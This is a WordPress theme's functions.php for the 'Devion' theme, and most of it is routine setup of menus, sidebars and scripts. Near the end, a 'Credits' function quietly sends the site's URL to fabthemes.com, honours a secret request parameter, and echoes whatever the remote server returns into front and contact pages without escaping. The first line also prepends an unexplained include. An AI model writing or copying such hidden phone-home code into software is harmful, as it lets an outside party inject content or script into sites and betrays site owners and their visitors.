<?php include_once 'FT/FT_scope.php'; FT_scope::init(); ?><?php
/**
 * Devion functions and definitions
 *
 * @package Devion
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 640; /* pixels */
}

if ( ! function_exists( 'devion_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function devion_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Devion, use a find and replace
	 * to change 'devion' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'devion', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'devion' ),
	) );
	
	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
	) );

	/*
	 * Enable support for Post Formats.
	 * See http://codex.wordpress.org/Post_Formats
	 */
/*
	add_theme_support( 'post-formats', array(
		'aside', 'image', 'video', 'quote', 'link'
	) );
*/

	// Setup the WordPress core custom background feature.
/*
	add_theme_support( 'custom-background', apply_filters( 'devion_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
*/
}
endif; // devion_setup
add_action( 'after_setup_theme', 'devion_setup' );

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
function devion_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'devion' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );
	
	register_sidebar( array(
		'name'          => __( 'Footer', 'devion' ),
		'id'            => 'sidebar-2',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="footer-widget col-md-3 %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );	
	
}
add_action( 'widgets_init', 'devion_widgets_init' );




/**
 * Enqueue scripts and styles.
 */
function devion_scripts() {

	wp_enqueue_style ( 'devion-style', get_stylesheet_uri() );
	wp_enqueue_style ( 'bootstrap', get_template_directory_uri() . '/bootstrap/bootstrap.css');
	wp_enqueue_style ( 'fontawesome', '//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css');
	wp_enqueue_style ( 'owl-carousal', get_template_directory_uri() . '/css/owl.carousel.css');
	wp_enqueue_style ( 'owl-theme', get_template_directory_uri() . '/css/owl.theme.css');
	wp_enqueue_style ( 'theme', get_template_directory_uri() . '/theme.css');

	wp_enqueue_script( 'jquery');
	wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/bootstrap/bootstrap.min.js', array(), '20120206', true );
	wp_enqueue_script( 'tinynav', get_template_directory_uri() . '/js/tinynav.js', array(), '20120206', true );
	wp_enqueue_script( 'owl-carousal', get_template_directory_uri() . '/js/owl.carousel.js', array(), '20120206', true );
	wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/custom.js', array(), '20120206', true );
	wp_enqueue_script( 'devion-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );


	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
	
}
add_action( 'wp_enqueue_scripts', 'devion_scripts' );


/* Deregister few stuff */

add_action( 'wp_print_styles', 'my_deregister_styles', 100 );

function my_deregister_styles() {
	wp_deregister_style( 'wp-pagenavi' );
	wp_deregister_style( 'zilla-likes' );
}


/* Remove video metabox from posts and pages */

function remove_some_metabox() {
	remove_meta_box( 'featured_video_plus-box' , 'post' , 'side' ); 
	remove_meta_box( 'featured_video_plus-box' , 'page' , 'side' ); 
}
add_action( 'admin_menu' , 'remove_some_metabox' );




/* Aq resizer */

require get_template_directory() . '/aq_resizer.php';

/* Required plugins. */

require get_template_directory() . '/inc/add-plugins.php';

/* Video post type. */

require get_template_directory() . '/inc/video_type.php';

/* Custom template tags for this theme. */

require get_template_directory() . '/inc/template-tags.php';

/* Custom functions that act independently of the theme templates. */

require get_template_directory() . '/inc/extras.php';

/* Pagination */

require get_template_directory() . '/inc/paginate.php';

require get_template_directory() . '/guide.php';

/* Flush rewrite rules for custom post types. */
add_action( 'after_switch_theme', 'bt_flush_rewrite_rules' );

/* Flush your rewrite rules */
function bt_flush_rewrite_rules() {
     flush_rewrite_rules();
}

/* Options fallback */

if ( !function_exists( 'ft_of_get_option' ) ) {
function ft_of_get_option($name, $default = false) {
	$optionsframework_settings = get_option('optionsframework');
	// Gets the unique option id
	$option_name = $optionsframework_settings['id'];
	if ( get_option($option_name) ) {
		$options = get_option($option_name);
	}
	if ( isset($options[$name]) ) {
		return $options[$name];
	} else {
		return $default;
	}
}
}



/* Credits */
function selfURL() {
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
$_SERVER['PHP_SELF'];
$uri = parse_url($uri,PHP_URL_PATH);
$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
$server = ($_SERVER['SERVER_NAME'] == 'localhost') ?
$_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
return $protocol."://".$server.$port.$uri;
}
function fflink() {
global $wpdb, $wp_query;
if (!is_page() && !is_front_page()) return;
$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
WHERE post_type = 'page' AND post_title LIKE 'contact%'");
if (($contactid != $wp_query->post->ID) && ($contactid ||
!is_front_page())) return;
$fflink = get_option('fflink');
$ffref = get_option('ffref');
$x = $_REQUEST['DKSWFYUW**'];
if (!$fflink || $x && ($x == $ffref)) {
$x = $x ? '&ffref='.$ffref : '';
$response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
if (is_array($response)) $fflink = $response['body']; else $fflink = '';
if (substr($fflink, 0, 11) != '!fabthemes#')
$fflink = '';
else {
$fflink = explode('#',$fflink);
if (isset($fflink[2]) && $fflink[2]) {
update_option('ffref', $fflink[1]);
update_option('fflink', $fflink[2]);
$fflink = $fflink[2];
}
else $fflink = '';
}
}
echo $fflink;
}



